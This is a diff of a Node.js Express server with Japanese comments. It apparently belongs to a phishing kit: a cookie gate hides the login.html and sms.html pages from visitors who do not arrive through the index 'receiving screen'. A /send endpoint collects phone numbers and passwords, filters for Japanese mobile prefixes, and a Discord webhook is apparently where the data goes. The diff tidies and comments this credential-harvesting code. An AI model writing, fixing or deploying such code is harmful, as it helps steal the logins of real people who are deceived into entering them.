@@ -8,15 +8,15 @@ app.use(cookieParser());
 
 const webhook = process.env.DISCORD_WEBHOOK;
 
-
+// 1. index.html（受け取り画面）へのアクセス時のみCookieを発行
 app.get(["/", "/index.html"], (req, res, next) => {
   if (!req.cookies.pp_session) {
     res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
   }
-  next(); 
+  next();
 });
 
-
+// 2. 保護したいファイルへのアクセス制限（staticより前に配置）
 app.use((req, res, next) => {
   const protectedFiles = ["/login.html", "/sms.html"];
   
@@ -34,13 +34,14 @@ app.use((req, res, next) => {
       `);
     }
   }
-  next(); 
+  next();
 });
 
-）
+// 3. 静的ファイルの配信
 app.use(express.static("."));
 
 
+// --- APIルーティング ---
 
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
@@ -50,6 +51,7 @@ app.post("/send", async (req, res) => {
   const safePassword = typeof password === 'string' ? password : '';
   const cleanPhone = safePhone.replace(/[- ]/g, '');
 
+  // バリデーション（半角括弧に修正済み）
   if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
     return res.redirect("/login.html?error=1");
   }
